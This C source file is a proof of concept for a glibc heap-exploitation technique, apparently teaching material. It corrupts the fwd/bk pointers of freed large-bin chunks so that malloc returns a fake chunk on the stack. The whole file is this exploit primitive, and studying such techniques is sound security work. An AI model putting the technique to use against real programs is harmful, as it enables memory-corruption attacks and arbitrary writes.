#include <stdio.h>
#include <stdlib.h>

#define CHUNK_SIZE0 0x420
#define CHUNK_SIZE1 0x080

void main() {
    long *chunk0,
            *chunk1,
            *chunk2;

    long stack_array[140];

    // Allocate, and free three chunks
    // Insert them into the unsorted bin
    // Allocate chunks in between, to prevent consolidation
    chunk0 = malloc(CHUNK_SIZE0);
    malloc(CHUNK_SIZE1);
    chunk1 = malloc(CHUNK_SIZE0);
    malloc(CHUNK_SIZE1);
    chunk2 = malloc(CHUNK_SIZE0);
    malloc(CHUNK_SIZE1);

    free(chunk0);
    free(chunk1);
    free(chunk2);

    // Malloc a chunk, larger than any other unsorted bin chunks
    // Move the three chunks over to the large bin
    malloc(CHUNK_SIZE0+0x10);

    // Create the large bin fake chunk header
    stack_array[0] = 0x000;
    stack_array[1] = 0x431;

    // Next up, we will need to add
    // a fake heap chunk header, right after the end of our fake large bin bin chunk
    // This is because, there are checks for the next adjacent chunk
    // Since if malloc properly allocated this chunk, there would be one there
    stack_array[134] = 0x430;
    stack_array[135] = 0x050;

    // Set the fwd/bk pointers of our large bin fake chunk
    // So that they point to the two chunks were linking to here
    stack_array[2] = ((long)chunk1 - 0x10); // fwd
    stack_array[3] = ((long)chunk2 - 0x10); // bk

    // Clear out the fd_nextsize/bk_nexsize
    // The large bin skiplist
    stack_array[4] = 0x00;
    stack_array[5] = 0x00;

    chunk1[1] = (long)(stack_array); // bk
    chunk2[0] = (long)(stack_array); // fwd
    
    // Allocate the chunk we inserted after
    malloc(CHUNK_SIZE0);

    // Allocate our fake large bin chunk that is on the stack
    malloc(CHUNK_SIZE0);
}
